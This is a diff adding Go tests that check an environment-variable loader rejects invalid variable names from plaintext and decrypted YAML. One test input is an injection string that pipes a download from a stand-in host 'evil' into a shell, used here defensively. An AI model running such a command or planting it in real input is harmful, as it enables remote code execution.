@@ -4,6 +4,7 @@ import (
 	"os"
 	"path/filepath"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 
@@ -247,5 +248,33 @@ func TestSelectorInDecryptedFileIsError(t *testing.T) {
 	_, err := Load(Options{RepoDir: repo, Decrypt: decrypt})
 	if err == nil || !strings.Contains(err.Error(), "EZC_ENV names the environment") {
 		t.Errorf("got %v", err)
+	}
+}
+
+func TestInvalidVariableNamesAreErrors(t *testing.T) {
+	for _, name := range []string{"X=1; curl evil|sh #", "", "1ABC", "A-B", "A B", "A\nB"} {
+		t.Run(name, func(t *testing.T) {
+			_, repo := tree(t, map[string]string{"repo/common.yaml": "x: y\n", "repo/common.enc.yaml": "x: y\n"})
+			if err := os.WriteFile(filepath.Join(repo, "common.yaml"), []byte(strconv.Quote(name)+": x\n"), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			_, err := Load(Options{RepoDir: repo})
+			if err == nil || !strings.Contains(err.Error(), "is not a valid variable name") {
+				t.Errorf("plaintext: got %v", err)
+			}
+			decrypt := func(string) ([]backend.Pair, error) { return []backend.Pair{{Name: name, Value: "v"}}, nil }
+			_, err = Load(Options{RepoDir: repo, Decrypt: decrypt})
+			if err == nil || !strings.Contains(err.Error(), "is not a valid variable name") {
+				t.Errorf("decrypted: got %v", err)
+			}
+		})
+	}
+}
+
+func TestValidVariableNamesAreAccepted(t *testing.T) {
+	_, repo := tree(t, map[string]string{"repo/common.yaml": "_OK1: a\nlower_case: b\n"})
+	r := mustResolve(t, Options{RepoDir: repo})
+	if r.Env["_OK1"] != "a" || r.Env["lower_case"] != "b" {
+		t.Errorf("got %v", r.Env)
 	}
 }
